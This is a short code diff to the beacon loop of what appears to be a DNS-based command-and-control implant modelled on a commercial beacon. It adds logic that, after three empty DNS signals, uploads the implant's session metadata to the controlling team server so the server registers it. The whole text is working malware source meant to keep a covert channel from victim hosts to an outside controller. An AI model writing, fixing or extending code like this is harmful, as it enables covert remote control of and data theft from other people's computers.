@@ -157,8 +157,19 @@ void beacon(LPVOID lpReserved) {
 			signal = ntohl(signal) ^ dnsidle;
 
 			if (signal == 0x0) {
-				/* do nothing... according to DNS record, there's nothing for us to do */
-				// dlog("dnsb.beacon - according to DNS record, there's nothing for us to do \n");
+				/* Zero signal: the TS does not have a session for us yet
+				 * (a fresh TS process forgets every beacon). The official
+				 * beacon carries its metadata to the TS through the query
+				 * stream itself, so it registers within one cycle; our
+				 * checkin query only carries the agent id, and waiting for
+				 * a 0xF1 signal deadlocks (TS signals only sessions it
+				 * knows). Break the loop: after three consecutive zero
+				 * cycles, push one metadata upload. */
+				static int zero_cycles = 0;
+				if (++zero_cycles >= 3) {
+					zero_cycles = 0;
+					dns_put(dnsbeacon_putmetadata, post_url, bigsession.data, bigsession.length);
+				}
 			}
 			else if ((signal & 0xFFFFFFF0) == 0xF0) {
 
